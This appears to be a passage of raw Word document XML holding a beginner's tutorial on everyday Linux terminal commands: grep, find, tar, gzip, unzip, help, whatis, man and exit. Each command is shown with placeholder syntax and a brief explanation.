          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>grep -r "&lt;string&gt;"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>&lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to search for the given string in all files recursively in the current working directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A6429E" w14:textId="441CECC9"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11CB3315" wp14:editId="08CD3953">
            <wp:extent cx="4076700"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3048000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A568F52"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lastRenderedPageBreak/>
        <w:t>Find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C53A97"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This command searches for </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>files matching specified criteria</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the given location. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find &lt;folder-to-search&gt; -name &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> its </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>‘-name’</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option to make a case sensitive search and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find &lt;folder-to-search&gt; -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>iname</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&lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to make a case-insensitive search for files with the given file names.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="9750" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="487"/>
        <w:gridCol w:w="9263"/>
      </w:tblGrid>
      <w:tr w:rsidR="00482630" w:rsidRPr="00AD72DF" w14:paraId="1CC43FF7" w14:textId="77777777" w:rsidTr="00482630">
        <w:trPr>
          <w:trHeight w:val="403"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="487" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A65B228" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="298" w:lineRule="atLeast"/>
              <w:jc w:val="right"/>
              <w:textAlignment w:val="baseline"/>
              <w:divId w:val="306128718"/>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1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9263" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A7099AD" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="298" w:lineRule="atLeast"/>
              <w:textAlignment w:val="baseline"/>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000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>find &lt;folder-to-search&gt; -</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD72DF">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>iname</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD72DF">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt;file-name&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2FD6B076" w14:textId="401BB181"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3B73784F" wp14:editId="22E180EC">
            <wp:extent cx="4295775" cy="1247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1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3C6E84"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tar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B689B03"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This command creates, views and extracts tar archives. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cvf</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&lt;archive-name.tar&gt; &lt;file1-OR-file2-OR-both-to-archive&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>create,</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tvf</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&lt;archive-to-view.tar&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xvf</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&lt;archive-to-extract.tar&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to extract tar archives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570FB2DB" w14:textId="0DCA5268"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57DB33B5" wp14:editId="3B0A1B69">
            <wp:extent cx="5381625" cy="2543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2543175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="104D6390"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="03F1434A"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>gzip</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&lt;filename&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> creates and extracts </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> archives. You can use its </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</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-d &lt;filename&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to extract </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> archives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AF154B" w14:textId="47C23509"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0F5B8BC3" wp14:editId="0BEE15AD">
            <wp:extent cx="5591175" cy="203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75" cy="2038350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD0CCEB"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unzip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615211B6"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unzip &lt;archive-to-extract.zip&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> unzips a given zip archive. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>unzip -l &lt;archive-to-extract.zip&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view the contents of the zip file without extracting it. It’s the same as you using an archive program to extract zip archives in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247E51C1" w14:textId="0A6ADEF3"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460D659F" wp14:editId="7A0AC66B">
            <wp:extent cx="5257800" cy="318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3181350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D131C67"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help</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0135533E"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lastRenderedPageBreak/>
        <w:t>&lt;command-name&gt; --help</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> lists all the available commands in the terminal. You can use ‘-h’ or ‘–help’ (help has two hyphens here) option with any command to get help for that specific command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C7315C" w14:textId="0AB38E87"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0B005DEE" wp14:editId="13D9197D">
            <wp:extent cx="5553075" cy="6600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075" cy="6600825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BD8D55"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>whatis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – What is this command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E3E573"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>whatis</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&lt;command-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows a single-line description for the given command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E63216" w14:textId="015AC5E1"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28202CC8" wp14:editId="44A82330">
            <wp:extent cx="5943600" cy="1046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46480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="121C5082"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man – Manual</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63494EE3"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man &lt;command-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows the manual page for the given command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E643522" w14:textId="5CB3380E"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7562CCC5" wp14:editId="4ED857F5">
            <wp:extent cx="5943600" cy="373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34435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35570496"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exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6657C0E9"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exit</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
